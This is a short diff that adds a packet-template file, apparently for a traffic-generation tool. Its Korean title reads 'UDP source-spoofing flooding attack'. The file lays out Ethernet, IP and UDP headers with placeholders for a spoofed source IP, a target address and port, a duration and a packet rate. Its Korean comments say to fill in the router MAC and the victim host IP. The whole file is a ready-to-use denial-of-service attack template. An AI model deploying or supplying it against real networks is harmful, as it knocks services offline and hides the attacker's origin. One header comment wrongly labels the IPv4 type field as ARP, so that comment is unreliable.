@@ -1,0 +1,34 @@
+#
+# UDP 소스 위변조 플러딩 공격
+<UDP>[@@DURATION,@@PPS]
+{
+# Ethernet HEADER ----
+# ****** 1) 다음의 dest MAC 주소를 전달할 라우터의 MAC 주소로 대치
+@@DMAC       # dest MAC
+@@SMAC	# src MAC
+08 00	# Type : ARP
+
+# IP Header
+45	# Version : 4
+00	# Differentiated Service Field : 0 ( DSCP 0, Default; ECN : 0)
+00 30	# Total Length : 48
+00 00	# Identification
+00	# Flag
+00	# Offset
+40	# Time To Live
+11	# Protocol : UDP
+00 00	# Header Checksum
+@@SIP	# Source IP
+# ****** 2) 다음의 dest IP 주소를 보낼 호스트의 IP 주소로 대치
+@@DIP		# dest ip
+
+
+# UDP Header
+GK GG		# Source Port
+@@DPORT		# Dest Port
+00 1c		# Length
+00 00		# CheckSum : none
+
+# Data
+GG GG GG GG GG GG GG GG GG GG GG GG GG GG  GG GG GG GG GG GG  
+}
